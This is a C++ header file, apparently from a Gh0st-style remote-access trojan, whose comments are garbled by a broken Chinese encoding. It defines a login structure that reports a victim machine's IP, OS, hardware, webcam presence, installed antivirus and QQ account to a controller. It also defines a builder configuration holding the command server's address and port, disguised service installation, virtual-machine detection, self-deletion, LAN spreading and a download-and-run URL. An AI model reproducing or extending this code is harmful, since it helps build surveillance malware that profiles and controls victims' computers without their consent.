#pragma once
#include "TCHAR.h"
#include "ClientSocket.h"
#include <Vfw.h>

#pragma comment(lib,"Vfw32.lib")

typedef struct  _LOGIN_INFOR
{	
	
	BYTE			bToken;			// ȡ1����½��Ϣ
	IN_ADDR			IPAddress;		// �洢32λ��IPv4�ĵ�ַ���ݽṹ
	char			OsVerInfoEx[sizeof(OSVERSIONINFOEX)];// �汾��Ϣ
	DWORD			dwCPUMHz;		// CPU��Ƶ
	IN_ADDR			ClientAddr;		// �洢32λ��IPv4�ĵ�ַ���ݽṹ
	char			szPCName[MAX_PATH];	// ������
	BOOL			bWebCamIsExist;		// �Ƿ�������ͷ
	DWORD			dwSpeed;		// ����
	int				nCPUNumber;		// CPU����
	DWORD			MemSize;		// �ڴ��С
	char			Virus[40];		// ɱ�����
	char			szQQNum[32];	// ��½QQ
	bool            bIsWow64;        //ϵͳƽ̨
	BOOL			bIsActive;	    // �û�״̬
	char        sznet[20];      //net type
}LOGIN_INFOR,*PLOGIN_INFOR;

struct MODIFY_DATA
{
	TCHAR szDns[300];		//���ߵ�ַ
	TCHAR dwPort[32];		//���߶˿�
	TCHAR szGroup[50];		//���߷���
	TCHAR szVersion[32];	//���߰汾
	TCHAR szGetGroup[256];	//����Ψһ��ʶ
	BOOL  bRunOnce;         //�Ƿ�Ϊ��ɫ��װ
	BOOL  bRuns;            //�Ƿ�������Ŀ¼����
	BOOL  bService;         //�Ƿ��Ƿ�������
	TCHAR SerName[100];     //��������
	TCHAR Serdisplay[128];  //��ʾ����
	TCHAR Serdesc[256];     //��������
	TCHAR ReleasePath[100]; //��װ;��
	TCHAR ReleaseName[50];  //��װ����
	WORD FileAttribute;      //�ļ�����
	BOOL  bLanPenetrate;    //��������
	CHAR Mexi[100];          //���л���
	WORD  Dele_zd;          //��װ����
	BOOL Dele_te;            //��װ��ɾ��
	BOOL Fvm;            //vm
	BOOL Dele_fs;            //ռ�ӷ�ɾ����װ
	BOOL Fhb;           //����
	BOOL Zjz;
	BOOL fsc;
	CHAR szDownRun[512];   //�������е�ַ
};
int sendLoginInfo(CClientSocket* ClientObject,DWORD dwSpeed);

